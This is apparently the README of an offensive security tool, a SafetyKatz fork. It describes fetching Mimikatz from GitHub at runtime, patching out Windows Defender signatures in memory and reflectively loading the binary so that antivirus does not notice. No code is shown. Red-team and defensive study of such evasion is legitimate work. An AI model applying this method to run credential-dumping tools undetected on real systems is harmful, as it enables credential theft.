Fork for studying Mimikatz loading techniques for AV evasion.

# BetterSafetyKatz?

This modified fork of SafetyKatz dynamically fetches the latest pre-compiled release of Mimikatz directly from the gentilkiwi GitHub repo, 
runtime patching on detected signatures and uses @subtee's PE Loader to get it into memory.

1. Gets the URL for the latest ZIP / PreCompiled Mimikatz binary directly from GitHub Repo
2. Unzipped in memory, turned into HEX. Then strings/signatures detected by Windows Defender are replaced with random strings of the same size 
    (Used https://github.com/matterpreter/DefenderCheck to gather signatures detected)
3. PE-Loaded into mem using @subtee POC (Added delays between mapping of DLLs-> Functions , Windows Defender thought it was to fast..)

Stolen from @harmj0y, @subtee and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
